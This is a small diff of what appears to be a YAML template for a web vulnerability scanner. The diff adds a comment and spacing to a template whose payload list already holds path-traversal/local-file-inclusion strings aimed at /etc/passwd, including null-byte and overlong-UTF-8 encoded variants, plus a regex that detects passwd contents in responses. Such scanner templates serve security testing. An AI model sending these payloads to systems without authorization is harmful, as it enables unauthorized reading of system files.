@@ -1,15 +1,19 @@
 generate:
   - payload:
+    #LFI
     - ../../../../../../../../../etc/passwd
     - ../../../../../../../../../etc/passwd%00
     - ../../../../../../../../../etc/passwd\u0000
     - ..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
     - ..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc/passwd
+
   - method:
     - postfix
+
 detect:
   - response:
     - body: '(root:x:)|(/bin/bash)|(/usr/sbin/nologin)'
+
 meta-info:
   - type: ptrav
   - threat: 80
